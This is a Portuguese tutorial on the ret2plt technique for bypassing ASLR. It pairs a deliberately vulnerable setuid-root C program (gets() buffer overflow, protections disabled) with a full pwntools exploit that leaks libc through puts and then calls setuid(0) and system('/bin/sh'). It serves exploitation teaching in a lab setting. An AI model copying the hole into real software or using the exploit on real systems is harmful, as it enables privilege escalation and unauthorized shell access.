- [Teoria](#teoria)
- [<BeatBox> Puts Puts Puts </BeatBox>](#beatbox-puts-puts-puts-beatbox)
- [Exemplo](#exemplo)
  - [vuln.c](#vulnc)
  - [exploit](#exploit)

# Teoria
> Vale a pena revisar GOT e PLT caso precise

Resumo: 
- A GOT armazena o endereço da funcao apos ser resolvida!
  
- Quando nos chamamos uma funcao do libc, nao estamos chamando elas  diretamente, e sim a sua entrada na PLT.

- A PLT checa a GOT, caso o endereço ja tenha sido resolvido, `jmp` la... caso o endereço ainda nao tenha sido, coordena com `ld.so` para resolver!


A técnica ret2plt pode ser considerada o ret2libc do mundo com ASLR!

Da mesma maneira que podíamos retornar para o libc quando o NX foi ativado, 
agora podemos voltar para a PLT!

Podemos fazer isso pois a PLT (e GOT) nao tem seu endereço alterado pelo ASLR,
somente por PIE!

Nos poderíamos usar isso para, por exemplo, chamar system() ... mas existe 
uma alternativa mais divertida!

# <BeatBox> Puts Puts Puts </BeatBox>

Nos podemos ler a GOT de uma funcao **JA RESOLVIDA**, e calcular o 
endereço da base do libc, ja que as funções estão a um offset constante!

Tendo o endereço base do libc, podemos chamar quantas funções quisermos, mesmo 
que nao tenham sido usadas originalmente pelo programa!

Para fazer isso, vamos usar `puts`: printa uma `string` pro terminal!

Vamos passar entrada para `puts na got`, assim: `puts vai printar o endereço resolvido de puts`

Em seguida, nos chamamos main (ou a funcao vulnerável) e executamos o BoF de 
novo, so que agora que a base do libc, podemos usar todo o seu potencial

Em x86_64 bits nos podemos fazer:
```
pop_rdi_gadget
got.puts

plt.puts    -> rdi = primeiro arg, e rdi aponta para 
              a got com o endereço resolvido de puts

main
```
E em x86 bits:
```
plt.puts
main
got.puts
```

Para calcular a base do libc a partir desse leak, basta fazer:
```py
leak = int(recv(), 16)
libc.address = leak - libc.sym.puts
```
`libc.sym.*` Armazena o offset dentro daquela versão do libc, isto e:
`puts = base + 0x1234`, `exit = base + 0x4321`, `system = base + offset`, etc...

Portanto, com `leak = puts` -> `leak = base + 0x1234` 
-> `base = leak - 0x1234` -> `base = leak - offset`

Agora, basta criar outra payload e enviar o BoF de novo, so que com: setuid + conexão remota + system + exit

Ou o que raios a sua imaginação bolar :D

# Exemplo

## vuln.c
```c
#include <stdio.h>
/*
gcc vuln.c -fno-stack-protector -no-pie -ggdb -z relro -z now -o vuln ;
sudo chown root vuln ; 
sudo chmod +s vuln ;
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space ;
checksec vuln ;
*/

/* 
O checksec deve dar:
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
*/
void vuln() {
    puts("Ola :D ! Qual o seu nome?");

    char buffer[20];
    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
```
## exploit
```py
#!/usr/bin/python3
from pwn import *
from time import sleep

context.binary = elf = ELF("vuln")
libc = elf.libc
rop = ROP(elf)
io = process(elf.path)
io.recvline()

if args.SLEEP: sleep(5)

##################################################
# 
# A plt nao tem seu endereco afetado pelo ASLR
# 
# Entao podemos chamar uma funcao do libc por 
# meio dela, sem precisar de leak
#
# Assim, vamos chamar puts por meio da plt!
#
# Alem disso, a got tambem nao e afetada,
# e ela armazena o endereco das funcoes resolvidas
#
# E oq o puts vai printar? um valor da got!
# Assim, nos dando o leak do libc
#
##################################################

payload = b'A'*40 + flat(
    rop.find_gadget(['pop rdi', 'ret']).address,
    elf.got.puts,
    elf.plt.puts, # call puts("got.puts")
    elf.sym.vuln  # voltar pra vuln 
)

io.sendline(payload)

##################################################
#
# Receber leak
#
##################################################

libc.address = int(bytearray(
    io.recvline()[:-1:])[::-1].hex(),
    16) - libc.sym.puts

# >>> leak                                      # Botei um valor qualquer 
#     b'\xf0\xb5[\x16\xc8\x7f\n'
#
# >>> leak[:-1:]                                # Remover \n
#     b'\xf0\xb5[\x16\xc8\x7f'
#
# >>> bytearray(leak[:-1:]).hex()               # converter pra hexstring
#     'f0b55b16c87f'
#
# >>> bytearray(leak[:-1:])[::-1].hex()         # Little Endian
#     '7fc8165bb5f0'
#
# >>> int(bytearray(leak[:-1:])[::-1].hex(),16) # int
#     140497345295856

# Em seguida, leak - offset_puts ===> base_libc

log.success("Libc Leak: "+hex(libc.address))

##################################################
#
# vuln parte 2, o retorno
#
##################################################

io.recvline()

payload = b'A'*40 + flat(
    # Privesc
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.setuid,
    
    # System
    rop.find_gadget(['pop rdi', 'ret']).address,
    next(libc.search(b"/bin/sh\x00")),
    libc.sym.system,

    # Exit
    rop.find_gadget(['pop rdi', 'ret']).address,
    0,
    libc.sym.exit
)

io.sendline(payload)
io.interactive()
```